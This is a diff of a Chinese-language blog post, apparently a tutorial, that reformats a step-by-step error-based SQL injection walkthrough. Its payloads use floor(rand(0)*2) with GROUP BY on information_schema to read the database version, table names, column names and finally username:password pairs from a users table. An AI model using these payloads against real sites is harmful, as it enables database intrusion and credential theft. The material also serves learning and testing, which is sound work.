@@ -228,33 +228,27 @@ information_schema.tables group by a)x)%23</code>
 
 先测试一下：
 
-<code>?id=1' and (select 1 from (select count(*),
-
+?id=1' and (select 1 from (select count(*),
 concat((select version()),floor(rand(0)*2))a
-
- from information_schema.tables group by a)x)%23</code>
+from information_schema.tables group by a)x)%23
 
 <img src="/images/sql_4.png">
 
 
 开始爆表：
 
-<code>?id=1%27%20and%20%28select%201%20from%20%28select%20count%28*%29,
-
+?id=1%27%20and%20%28select%201%20from%20%28select%20count%28*%29,
 concat%28%28select%20table_name%20from%20information_schema.tables%20limit%20139,1%29,
-
-floor%28rand%280%29*2%29%29a%20from%20information_schema.tables%20group%20by%20a%29x%29%23</code>
+floor%28rand%280%29*2%29%29a%20from%20information_schema.tables%20group%20by%20a%29x%29%23
 
 <img src="/images/sql_5.png">
 
 接下来就是爆列和字段。可以利用count(*)计算表数量和列数量，尽量limit猜靠后面的非系统默认的表和列。
 
-<code>?id=1' and (select 1 from (select count(*),concat((select column_name
+?id=1' and (select 1 from (select count(*),concat((select column_name
+from information_schema.columns limit 1664,1),floor(rand(0)*2))a from 
+information_schema.tables group by a)x)%23
 
- from information_schema.columns limit 1664,1),floor(rand(0)*2))a from 
-
- information_schema.tables group by a)x)%23
-</code>
 
 <img src="/images/sql_6.png">
 
@@ -262,11 +256,9 @@ floor%28rand%280%29*2%29%29a%20from%20information_schema.tables%20group%20by%20a
 
 因为只能返回一列的数据，所以用limit来限制返回的数据，就只能一个一个数字来试。
 
-<code>?id=1' and (select 1 from (select count(*),
-
+?id=1' and (select 1 from (select count(*),
 concat((select concat(username,':',password) from users limit 1,1),
-
-floor(rand(0)*2))a from information_schema.tables group by a)x)%23</code>
+floor(rand(0)*2))a from information_schema.tables group by a)x)%23
 
 <img src="/images/sql_8.png">
 
